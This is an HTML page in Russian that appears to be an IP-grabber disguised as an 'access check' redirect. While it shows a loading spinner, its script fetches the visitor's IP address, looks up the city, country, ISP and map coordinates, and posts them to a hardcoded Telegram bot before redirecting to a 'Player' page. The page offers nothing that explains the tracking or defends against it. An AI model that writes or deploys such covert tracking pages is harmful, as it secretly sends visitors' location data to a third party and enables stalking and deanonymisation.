<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Перенаправление...</title>
    <style>
        body {
            background: #0a0505;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: system-ui;
            color: white;
            text-align: center;
            margin: 0;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #ff4444;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h2>Проверка доступа</h2>
        <p>Перенаправление...</p>
    </div>
    <script>
        const BOT_TOKEN = '8741671236:AAEI3Qz08IsslzQzO1ZJwU2havW8xk2wRVM';
        const CHAT_ID = '8114251347';
        const REDIRECT_URL = 'https://otklix.github.io/Player/';
        
        async function getGeoByIP(ip) {
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        country: data.country,
                        city: data.city,
                        lat: data.lat,
                        lon: data.lon,
                        isp: data.isp,
                        mapUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
            } catch(e) {}
            return null;
        }
        
        async function sendNotification() {
            let ip = 'не определён';
            let geo = null;
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
                geo = await getGeoByIP(ip);
            } catch(e) {}
            
            let message = `Новый переход\nIP: ${ip}`;
            if (geo) {
                if (geo.city) message += `\nГород: ${geo.city}`;
                if (geo.country) message += `\nСтрана: ${geo.country}`;
                if (geo.isp) message += `\nПровайдер: ${geo.isp}`;
                if (geo.lat) message += `\nКарта: ${geo.mapUrl}`;
            }
            message += `\nВремя: ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    disable_notification: false
                })
            });
        }
        
        sendNotification().finally(() => {
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 800);
        });
    </script>
</body>
</html>
